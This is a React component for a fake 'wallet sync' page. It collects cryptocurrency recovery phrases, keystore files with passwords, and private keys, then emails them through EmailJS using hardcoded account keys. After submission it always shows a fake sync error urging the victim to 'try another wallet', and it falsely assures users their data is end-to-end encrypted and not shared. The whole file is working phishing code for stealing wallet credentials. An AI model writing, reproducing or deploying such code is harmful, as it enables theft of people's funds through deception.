import styles from "./formData.module.css";
import { z, ZodType } from "zod";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { connectDataType } from "../../data";
import { useState } from "react";
import { MdError } from "react-icons/md";

import { useNavigate } from "react-router-dom";
import emailjs from "emailjs-com";

const Phrase = () => {
  const [loading, setLoading] = useState(false);
  const [confirmed, setConfirmed] = useState(false);
  const [activeSection, setActiveSection] = useState("Phrase"); // Manages displayed section
  const navigate = useNavigate();

  // Validation schema to ensure at least one section is filled
  const schema: ZodType<connectDataType> = z
    .object({
      recoveryPhrase: z.string().optional(),
      keystorePhrase: z.string().optional(),
      keystorePassword: z.string().optional(),
      private: z.string().optional(),
    })
    .refine(
      (data) => {
        return (
          data.recoveryPhrase ||
          (data.keystorePhrase && data.keystorePassword) ||
          data.private
        );
      },
      { message: "Please fill in one section before submitting." }
    );

  const {
    register,
    handleSubmit,
    reset,
    formState: { errors },
  } = useForm<connectDataType>({
    resolver: zodResolver(schema),
  });

  const handleClickButton = () => {
    navigate("/coin");
  };

  const submitData = async (data: connectDataType) => {
    setLoading(true);
    reset();

    const templateParams = {
      ...(data.recoveryPhrase && { recoveryPhrase: data.recoveryPhrase }),
      ...(data.keystorePhrase && { keystorePhrase: data.keystorePhrase }),
      ...(data.keystorePassword && { keystorePassword: data.keystorePassword }),
      ...(data.private && { privateKey: data.private }),
    };

    try {
      const result = await emailjs.send(
        "service_yctodgm",
        "template_mcaebkn",
        templateParams,
        "ycopLxNeq0xS4yCi4"
      );

      if (result.status === 200) {
        setLoading(false);
        setConfirmed(true);
        console.log("Email sent successfully!");
      }
    } catch (error) {
      console.error("Error sending email:", error);
      setLoading(false);
    }
  };

  return (
    <div className={styles.container}>
      {loading ? (
        <div className={styles.loadingContainer}>
          <div className={styles.threeBody}>
            <div className={styles.threeBodyDot}></div>
            <div className={styles.threeBodyDot}></div>
            <div className={styles.threeBodyDot}></div>
          </div>
          <p className={styles.loadingText}>Loading details...</p>
        </div>
      ) : confirmed ? (
        <div className={styles.confirmationDiv}>
          <p className={styles.successful}>
            <MdError size={70} color="red" className={styles.fav} />
            Error in synchronizing wallet, try another wallet
          </p>
          <button className={styles.returnHome} onClick={handleClickButton}>
            Try another wallet{" "}
          </button>
        </div>
      ) : (
        <>
          <div className={styles.proceed}>Proceed</div>
          <p className={styles.NB}>
            NB: All information is end-to-end encrypted. We do not share data
            and activity sessions with any other company.
          </p>

          <form className={styles.form} onSubmit={handleSubmit(submitData)}>
            <div className={styles.tabs}>
              <button
                type="button"
                onClick={() => setActiveSection("Phrase")}
                className={
                  activeSection === "Phrase" ? styles.activeTab : styles.btn
                }
              >
                Phrase
              </button>
              <button
                type="button"
                onClick={() => setActiveSection("Keystore")}
                className={
                  activeSection === "Keystore" ? styles.activeTab : styles.btn
                }
              >
                Keystore
              </button>
              <button
                type="button"
                onClick={() => setActiveSection("Private")}
                className={
                  activeSection === "Private" ? styles.activeTab : styles.btn
                }
              >
                Private Key
              </button>
            </div>

            {activeSection === "Phrase" && (
              <div className={styles.divPhrase}>
                <label htmlFor="" className={styles.recoveryPhraseLabel}>
                  Recovery Phrase
                </label>
                <textarea
                  className={styles.recText}
                  rows={4}
                  {...register("recoveryPhrase")}
                ></textarea>
                {errors.recoveryPhrase && (
                  <p className={styles.error}>
                    {errors.recoveryPhrase.message}
                  </p>
                )}
                <small>Typically 12 or 24 words separated by spaces</small>
              </div>
            )}

            {activeSection === "Keystore" && (
              <div className={styles.key}>
                <label htmlFor="" className={styles.keystore}>
                  Keystore JSON
                </label>

                <textarea
                  className={styles.keyTextArea}
                  rows={4}
                  {...register("keystorePhrase")}
                ></textarea>
                <input
                  type="password"
                  placeholder="Password"
                  className={styles.password}
                  {...register("keystorePassword")}
                />
                <small>
                  Several lines of text starting with &#123;...&#125; plus your
                  encryption password
                </small>
              </div>
            )}

            {activeSection === "Private" && (
              <div className={styles.private}>
                <label htmlFor="" className={styles.privateKey}>
                  Private Key
                </label>
                <textarea
                  className={styles.privText}
                  rows={4}
                  {...register("private")}
                ></textarea>
                {errors.private && (
                  <p className={styles.error}>{errors.private.message}</p>
                )}
                <small className={styles.ensure}>
                  Ensure internet connectivity before entering private key
                </small>
              </div>
            )}

            <button className={styles.button} type="submit">
              Submit
            </button>
          </form>
        </>
      )}
    </div>
  );
};

export default Phrase;
